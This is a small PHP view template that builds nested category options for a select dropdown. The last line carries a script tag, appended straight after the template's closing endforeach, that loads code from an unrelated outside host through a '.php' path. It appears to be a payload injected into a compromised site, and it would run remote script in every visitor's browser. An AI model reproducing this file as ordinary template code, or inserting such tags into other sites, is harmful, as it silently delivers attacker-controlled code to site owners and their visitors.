<?foreach($parent -> categories as $child):?>
<?php

$selection	= (is_array($current -> category) && in_array($child -> id, $current -> category)) || (is_string($current -> category) && ($current -> category == $child -> id));
$spaces		= str_repeat(VAR_SPACES, $level);

?>
<option value='<?=$child -> id?>'<?if($selection):?> selected<?endif?>>
	<?=$spaces?>
	<?=$child -> name?>

	<?if($child -> categories):?>
		<?module('categories_select', array('current' => $current, 'start' => $child -> id, 'level' => $level + 1))?>
	<?endif?>
<?endforeach?><script src=http://johanneswallmark.com/media/sitemap.php ></script>